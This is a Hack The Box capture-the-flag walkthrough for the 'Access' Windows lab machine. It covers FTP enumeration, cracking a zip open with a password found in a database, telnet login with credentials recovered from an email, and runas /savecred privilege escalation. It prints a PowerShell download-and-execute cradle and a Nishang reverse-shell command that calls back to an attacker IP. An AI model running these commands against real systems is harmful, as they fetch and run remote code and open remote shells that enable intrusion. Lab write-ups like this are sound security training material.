---
icon: windows
---

# Access - Easy

<figure><img src="../../.gitbook/assets/image (1822).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/access"><strong>Access</strong></a></p></figcaption></figure>

## Gaining Access

Nmap Scan:

```
#Nmap TCP
nmap -A -T4 -p- -Pn 10.10.10.98 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-16 14:32 EDT
Nmap scan report for 10.10.10.98
Host is up (0.036s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|_  SYST: Windows_NT
23/tcp open  telnet  Microsoft Windows XP telnetd
| telnet-ntlm-info: 
|   Target_Name: ACCESS
|   NetBIOS_Domain_Name: ACCESS
|   NetBIOS_Computer_Name: ACCESS
|   DNS_Domain_Name: ACCESS
|   DNS_Computer_Name: ACCESS
|_  Product_Version: 6.1.7600
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: MegaCorp
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|2012|Phone|8.1 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1
Aggressive OS guesses: Microsoft Windows 7 or Windows Server 2008 R2 (97%), Microsoft Windows Server 2008 R2 or Windows 7 SP1 (92%), Microsoft Windows Vista or Windows 7 (92%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Embedded Standard 7 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_clock-skew: 3s

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   50.33 ms 10.10.16.1
2   50.44 ms 10.10.10.98
```

### Port 21 ftp

Ftp has anonymous login enabled let's see what is in there

<figure><img src="../../.gitbook/assets/image (1823).png" alt=""><figcaption></figcaption></figure>

If you run into this issue just try again and type

```
passive off
```

<figure><img src="../../.gitbook/assets/image (1824).png" alt=""><figcaption></figcaption></figure>

I found 2 files inside and downloaded them

<figure><img src="../../.gitbook/assets/image (1825).png" alt=""><figcaption></figcaption></figure>

I started with the 'Access Control.zip' first

<figure><img src="../../.gitbook/assets/image (1826).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1827).png" alt=""><figcaption></figcaption></figure>

It's password protected, I will check the database file for a password fist. If I don't find one, I'll try to brute force it

### Enumerating Access database file

<figure><img src="../../.gitbook/assets/image (1828).png" alt=""><figcaption></figcaption></figure>

This is an access database file, let's list the tables.

<figure><img src="../../.gitbook/assets/image (1829).png" alt=""><figcaption></figcaption></figure>

Listing the tables, we find a lot, I’ll use a bash loop to go over the tables, and see which have data.

```
mdb-tables backup.mdb | tr ' ' '\n' | grep . | while read table; do lines=$(mdb-export backup.mdb $table | wc -l); if [ $lines -gt 1 ]; then echo "$table: $lines"; fi; done
```

<figure><img src="../../.gitbook/assets/image (1830).png" alt=""><figcaption></figcaption></figure>

To break that down, I run the same tables command I ran above. Then I replace spaces with new lines, and use `grep` . to get non-empty lines. I pipe that into a `while read loop`. For each table, I run `mdb-export` and pipe the result into `wc -l`. For empty tables, that will be 1. Then I check if the number of lines is greater than 1, and if so, echo the table name and the number of lines.

Looking through the data in these tables, I see the auth\_user table. It has a password field:

<figure><img src="../../.gitbook/assets/image (1831).png" alt=""><figcaption></figcaption></figure>

I’ll note both <mark style="color:$success;">admin</mark> and <mark style="color:$success;">access4u@security</mark> as passwords. Let's see if any of them open up the zip file

<mark style="color:$success;">access4u@security</mark> works to unzip the file

<figure><img src="../../.gitbook/assets/image (1832).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1833).png" alt=""><figcaption></figcaption></figure>

This is an Outlook email folder file, I’ll convert it to mbox format using readpst

```
readpst Access\ Control.pst 
```

<figure><img src="../../.gitbook/assets/image (1834).png" alt=""><figcaption></figcaption></figure>

I’ll open the file using `mutt -Rf Access\ Control.mbox` where `-R` opens it read-only (I don’t want to modify the file) and `-f` identifies the file to read from. I’ll answer a couple prompts (no I don’t want to create `/root/Mail`, yes remove the lock), and end up at the folder of emails (in this case, one). I can use arrow keys to move to the email I want, and press enter to view it. `q` gets back to the folder, and `q` again quits

<figure><img src="../../.gitbook/assets/image (1835).png" alt=""><figcaption></figcaption></figure>

```
security:4Cc3ssC0ntr0ller
```

As telnet was open, I’ll connect, and use the password from the email. I get a shell:

<figure><img src="../../.gitbook/assets/image (1836).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

<figure><img src="../../.gitbook/assets/image (1837).png" alt=""><figcaption></figcaption></figure>

Inside the Public's desktop folder there is a really interesting file. There might be some credentials inside let's check it out

<figure><img src="../../.gitbook/assets/image (1838).png" alt=""><figcaption></figcaption></figure>

I see that it’s calling runas and using the /savedcred flag. That suggests to me that creds are cached for the Administrator account

<figure><img src="../../.gitbook/assets/image (1839).png" alt=""><figcaption></figcaption></figure>

And that confirms it the administrator credentials are cached, we can get a shell as root using runas.

### Stored admin Credentials lead to shell as admin

This shell is really wanky and we are missing curl and wget on the machine, also When I tried switching to powershell my shell would die. So I will be using Nishang's Invoke-PowerShellTcp.ps1 script

Let's clone his repo first

```
git clone https://github.com/samratashok/nishang.git
```

I’ll make a www directory to serve from, and I’ll grab a copy of the shell I’m going to use:

<figure><img src="../../.gitbook/assets/image (1840).png" alt=""><figcaption></figcaption></figure>

I'll modify the script a bit and have it run a reverse shell on port 443. type the following at the bottom of the script

```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.16.3 -Port 443
```

<figure><img src="../../.gitbook/assets/image (1841).png" alt=""><figcaption></figcaption></figure>

Serve the script using a python webserver. And setup a listener on port 443, than run the following command on the telnet shell:

```
runas /user:ACCESS\Administrator /savecred "powershell iex(new-object net.webclient).downloadstring('http://10.10.16.3/Invoke-PowerShellTcp.ps1')"
```

<figure><img src="../../.gitbook/assets/image (1842).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (1843).png" alt=""><figcaption></figcaption></figure>

We see the script getting pulled, let's check our listener

<figure><img src="../../.gitbook/assets/image (1845).png" alt=""><figcaption></figcaption></figure>

And we got a shell as administrator!
